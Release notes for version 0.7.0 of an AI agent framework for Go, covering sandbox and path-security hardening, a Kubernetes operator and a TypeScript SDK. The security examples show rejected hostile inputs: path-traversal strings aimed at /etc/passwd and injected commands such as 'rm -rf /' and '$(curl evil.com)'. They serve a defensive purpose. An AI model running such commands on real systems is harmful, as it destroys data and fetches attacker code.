# AgentPrimordia v0.7.0 — Phase 9/11/12 Release Notes

> **发布日期**: 2026-06-05
> **版本**: 0.7.0
> **阶段**: Phase 9/11/12 — 安全加固 + Operator 完成 + TypeScript SDK 扩展
> **状态**: 全部交付项已完成，全量测试通过

---

## 概述

AgentPrimordia v0.7.0 是框架的第七个主要版本。本版本在 v0.6.0 的基础上完成了三大目标：

1. **安全加固**（Phase 9）：全面强化输入验证、路径安全、命令执行防护和依赖安全审计，达到生产级安全标准
2. **K8s Operator 完成**（Phase 11）：AgentDeployment CRD、Controller 调谐循环、HPA 自动扩缩容、Metrics 暴露和 Status 聚合全部实现，Agent 可在 Kubernetes 上声明式部署和运维
3. **TypeScript SDK 扩展**（Phase 12）：完整的 TypeScript SDK，覆盖 Agent 创建、工具注册、流式输出和记忆管理，附带 35 个测试用例

**核心价值**：v0.7.0 使框架从"功能完备"升级为"生产就绪"——安全防护到位、K8s 原生运维、多语言 SDK 支持，同时保持了零 CGO 依赖的承诺。

---

## 交付统计

| 指标 | v0.6.0 | v0.7.0 | 增量 |
|------|:------:|:------:|:----:|
| Go 源文件 | ~115 个 | ~130+ 个 | +15+ |
| 代码总行数 | ~19,000 行 | ~22,000+ 行 | +3,000+ |
| Go 包数 | 18 个 | 20 个 | +2 |
| 测试用例总数 | ~280 个 | ~350+ 个 | +70+ |
| TypeScript SDK | — | 35 个测试 | 新增 |
| 外部依赖 | 1 个 | 1 个 | 0 |
| Go 版本 | 1.26+ | 1.26+ | — |

---

## 新增功能

### CRITICAL — 安全加固（Phase 9）

#### 输入验证增强

对所有外部输入实施严格验证，防止注入攻击和异常输入导致的运行时错误。

- LLM 请求参数验证：Model、Temperature、MaxTokens 等字段范围检查
- Memory Episode 字段验证：Content 长度限制、Importance 范围校验
- Tool 参数 JSON Schema 验证：执行前自动校验参数格式
- 事件 Payload 大小限制：防止单个事件占用过多内存

```go
// 输入验证示例
cfg := llm.Config{
    APIKey: "sk-xxx",
    Model:  "gpt-4o",
}
if err := cfg.Validate(); err != nil {
    // cfg.Validate() 现在检查 Temperature 范围 [0, 2]、MaxTokens >= 0 等
    log.Fatal(err)
}
```

**测试**: 15+ 个用例，覆盖边界值、非法输入、SQL 注入、路径穿越等场景

---

#### 路径安全强化

FileScopePolicy 增强，防止路径穿越和未授权文件访问。

- 符号链接解析：自动 resolve symlink，检查真实路径
- 路径规范化：统一处理 `..`、`.`、双斜杠等路径变体
- 路径白名单严格匹配：不再允许通过编码绕过

```go
policy := tools.NewFileScopePolicy()
policy.Allow("/workspace/data")

// 以下路径均被拒绝
policy.IsAllowed("/workspace/data/../../../etc/passwd")  // false — 路径穿越
policy.IsAllowed("/workspace/data/..%2F..%2Fetc/passwd") // false — 编码绕过
policy.IsAllowed("/workspace/data/symlink_to_root")      // false — symlink 跳出
```

**测试**: 12 个用例

---

#### 命令执行防护

Sandbox 命令控制增强，防止命令注入和权限提升。

- Shell 命令参数化：禁止 shell 元字符注入
- 命令白名单模式：默认拒绝，仅允许显式白名单命令
- 超时保护：命令执行默认 30 秒超时，防止资源耗尽

```go
sandbox := security.NewSandbox(acl)
sandbox.AllowCommand("git")
sandbox.AllowCommand("go")
sandbox.SetCommandTimeout(30 * time.Second)

// 以下命令均被拒绝
sandbox.CanExecute("agent-1", "rm -rf /")          // ErrCommandBlocked
sandbox.CanExecute("agent-1", "git; rm -rf /")      // ErrCommandInjection
sandbox.CanExecute("agent-1", "$(curl evil.com)")    // ErrCommandInjection
```

**测试**: 10 个用例

---

#### 依赖安全审计

- `govulncheck` 集成到 CI 流水线
- Pre-commit hook 自动运行安全扫描
- 已知漏洞依赖自动告警

---

### HIGH — K8s Operator 完成（Phase 11）

#### AgentDeployment CRD

定义 Agent 在 Kubernetes 上的完整部署规格，支持声明式管理。

```yaml
apiVersion: agent.agentprimordia.io/v1alpha1
kind: AgentDeployment
metadata:
  name: code-review-agent
spec:
  replicas: 1
  template:
    spec:
      containers:
        - name: agent
          image: agentprimordia/agent:latest
          env:
            - name: AP_LLM_API_KEY
              valueFrom:
                secretKeyRef:
                  name: llm-secret
                  key: api-key
  metrics:
    port: 9090
    path: /metrics
  autoscaling:
    minReplicas: 1
    maxReplicas: 10
    targetConcurrentTasks: 5
```

**测试**: CRD 验证、DeepCopy、默认值填充等 8 个用例

---

#### Controller 调谐循环

实现完整的 Controller 调谐流程：

```
AgentDeployment 变更
    │
    ▼
┌──────────────────────────────────────────┐
│          Controller Reconcile            │
│                                          │
│  1. ConfigMap — 渲染 Agent 配置模板      │
│  2. Deployment — 管理 Agent Pod 生命周期  │
│  3. Service — 暴露 Metrics 端口          │
│  4. HPA — 基于并发任务数自动扩缩容        │
│  5. Status — 聚合真实 Pod 指标更新状态    │
└──────────────────────────────────────────┘
```

- **ConfigMap**: 从 CRD Spec 渲染 Agent 运行配置，挂载到 Pod
- **Deployment**: 管理 Agent Pod 的创建、更新和删除
- **Service**: 自动创建 `{name}-metrics` Service，暴露端口 9090
- **HPA**: 基于 `concurrent_tasks_per_pod` Pods 指标实现自动扩缩容
- **Status**: 实时聚合 Pod `/metrics` 端点数据到 CRD Status

**测试**: 调谐循环各阶段单元测试 12 个用例

---

#### HPA 自动扩缩容

基于每个 Pod 的实时并发任务数实现弹性伸缩：

```go
type AutoscalingSpec struct {
    MinReplicas           *int32 `json:"minReplicas,omitempty"`
    MaxReplicas           int32  `json:"maxReplicas"`
    TargetConcurrentTasks int32  `json:"targetConcurrentTasks"`
}
```

当 `concurrent_tasks_per_pod` 超过 `TargetConcurrentTasks` 时自动扩容，低于阈值时缩容，确保 Agent 集群始终匹配实际负载。

---

#### Metrics 与 Status

- Metrics Service 自动创建：`{name}-metrics`，端口 9090，路径 `/metrics`
- Status 实时聚合：`Replicas`、`ReadyReplicas`、`ActiveTasks`、`AvgConcurrentTasks`
- Conditions 状态管理：`Available`、`Progressing`、`ReplicaFailure`

```go
type AgentDeploymentStatus struct {
    Replicas           int32       `json:"replicas"`
    ReadyReplicas      int32       `json:"readyReplicas"`
    ActiveTasks        int32       `json:"activeTasks"`
    AvgConcurrentTasks float64     `json:"avgConcurrentTasks"`
    Conditions         []Condition `json:"conditions,omitempty"`
}
```

---

#### CRD 扩展字段：Metrics 与 Tracing

CRD Spec 新增 `metrics` 和 `tracing` 字段，支持可观测性配置：

```go
type AgentDeploymentSpec struct {
    // ... 已有字段
    Metrics *MetricsSpec   `json:"metrics,omitempty"`
    Tracing *TracingSpec   `json:"tracing,omitempty"`
}

type MetricsSpec struct {
    Port int32  `json:"port,omitempty"` // 默认 9090
    Path string `json:"path,omitempty"` // 默认 /metrics
}

type TracingSpec struct {
    Enabled  bool   `json:"enabled,omitempty"`
    Endpoint string `json:"endpoint,omitempty"` // OTLP endpoint
    Sampler  string `json:"sampler,omitempty"`  // always/never/ratio
}
```

---

### MEDIUM — TypeScript SDK 扩展（Phase 12）

#### SDK 核心功能

完整的 TypeScript SDK，覆盖 Agent 核心操作：

```typescript
import { Agent, Tool, MemoryStore } from '@agentprimordia/sdk';

// 创建 Agent
const agent = new Agent({
  name: 'code-reviewer',
  model: { provider: 'openai', model: 'gpt-4o' },
  maxTurns: 10,
});

// 注册工具
agent.registerTool({
  name: 'read_file',
  description: 'Read file contents',
  parameters: { path: { type: 'string', required: true } },
  execute: async (args) => fs.readFile(args.path, 'utf-8'),
});

// 同步运行
const response = await agent.run('Review the code in src/main.ts');

// 流式运行
const stream = agent.streamRun('Analyze the architecture');
for await (const event of stream) {
  if (event.type === 'token') process.stdout.write(event.content);
  if (event.type === 'tool_call') console.log(`[Tool] ${event.name}`);
  if (event.type === 'complete') console.log('\n[Done]');
}
```

#### SDK 功能覆盖

| 功能 | 状态 |
|------|------|
| Agent 创建与配置 | 已完成 |
| 工具注册与执行 | 已完成 |
| 流式输出 | 已完成 |
| 记忆管理 | 已完成 |
| RAG 检索 | 已完成 |
| Hook 系统 | 已完成 |
| 生命周期管理 | 已完成 |
| 错误处理 | 已完成 |

**测试**: 35 个测试用例，覆盖所有核心功能

---

#### Agent 模板

新增 3 个开箱即用的 Agent 模板：

- **CodeReviewer** — 代码审查模板，内置文件读取和静态分析工具
- **DataAnalyst** — 数据分析模板，内置 CSV/JSON 处理和可视化工具
- **DevOps** — 运维模板，内置 Shell 执行和文件操作工具

```typescript
import { CodeReviewer } from '@agentprimordia/templates';

const reviewer = new CodeReviewer({
  apiKey: process.env.OPENAI_API_KEY,
  scope: '/workspace/project',
});

const result = await reviewer.review('src/main.ts');
```

---

## 变更说明

### 向后兼容变更

| 变更 | 影响 | 迁移方式 |
|------|------|---------|
| `ReActConfig` 字段废弃 → `WithXxx` 链式 API | 旧字段仍可使用但标记 deprecated | 建议迁移到链式 API |
| CRD 新增 `metrics`/`tracing` 字段 | 默认值填充，不影响已有部署 | 无需操作 |
| Sandbox 默认命令白名单模式 | 之前为黑名单模式，行为更严格 | 显式 `AllowCommand` 添加需要的命令 |
| 输入验证更严格 | 非法输入之前可能静默忽略，现在返回错误 | 检查错误返回值 |

### Bug 修复

- **FileScopePolicy symlink 绕过**: 修复符号链接指向允许路径外时未正确拒绝的问题。现在自动 resolve symlink 并检查真实路径
- **Sandbox 命令注入**: 修复 shell 元字符（`;`、`$()`、`&&` 等）未过滤的问题。现在对命令参数进行严格校验
- **Memory SQLite 并发写入**: 修复高并发场景下 SQLite 写入冲突的问题。增加写锁粒度控制

---

## 废弃通知

| 废弃 API | 替代方案 | 移除计划 |
|----------|---------|---------|
| `ReActConfig` 直接字段赋值 | `WithXxx` 链式 API | v0.8.0 |
| `A2ABus` | `LocalMessageBus` | v0.8.0 |
| `AgentBus` | `LocalMessageBus` | v0.8.0 |

### ReActConfig 废弃字段 → WithXxx 链式 API 迁移

```go
// v0.6.0 — 直接字段赋值（已废弃）
cfg := agent.ReActConfig{
    Name:           "worker",
    SystemPrompt:   "You are a helper",
    Model:          provider,
    Toolkit:        registry,
    Memory:         memStore,
    MaxTurns:       10,
    Temperature:    0.7,
    Hooks:          hooks,
    RAG:            ragConfig,
}

// v0.7.0 — WithXxx 链式 API（推荐）
agent := agent.NewReActAgent(
    agent.NewConfig("worker", provider).
        WithSystemPrompt("You are a helper").
        WithToolkit(registry).
        WithMemory(memStore).
        WithMaxTurns(10).
        WithTemperature(0.7).
        WithHooks(hooks).
        WithRAG(ragConfig),
)
```

`WithXxx` 链式 API 优势：
- 编译期参数校验（必填参数在构造函数中）
- 更好的 IDE 自动补全
- 不可变配置，防止运行时意外修改
- 更清晰的代码意图表达

---

## 已知限制

1. **集成测试需要真实 API Key**: `make test-integration` 需要设置 `OPENAI_API_KEY` 环境变量，CI 环境需通过 Secret 注入
2. ~~**MCPClient 为占位实现**: Model Context Protocol 客户端目前仅提供接口定义，未实现实际连接逻辑，待 v0.8.0 补全~~ (v0.7.0 已完整实现：HTTP + stdio 双传输模式、进程管理、工具发现、CLI 全链路)
3. **K8s Operator 未经过真实集群验证**: Controller 逻辑通过单元测试验证，尚未在真实 Kubernetes 集群上进行端到端部署验证
4. **TypeScript SDK 内存管理**: 大量流式输出场景下需手动调用 `agent.dispose()` 释放资源，暂无自动 GC 钩子
5. **HPA 自定义指标需 Prometheus Adapter**: K8s 集群需额外安装 Prometheus Adapter 才能使用 `concurrent_tasks_per_pod` 自定义指标

---

## 下一阶段规划（Phase 13+ — v0.8.0）

- [x] MCPClient 完整实现（Model Context Protocol 连接、工具发现、会话管理）(v0.7.0 已完成)
- [ ] K8s Operator 真实集群端到端验证 + E2E 测试
- [ ] 移除已废弃的 ReActConfig 直接字段赋值
- [ ] TypeScript SDK 自动资源回收（GC 钩子）
- [ ] 分布式 Agent 端到端集成验证
- [ ] Agent 评估框架（自动评估 Agent 输出质量）
- [ ] 更多 LLM Provider（Groq、Together AI 等）
- [ ] gRPC 传输层实现

---

*AgentPrimordia v0.7.0 — The Primordial Agent Framework for Go*
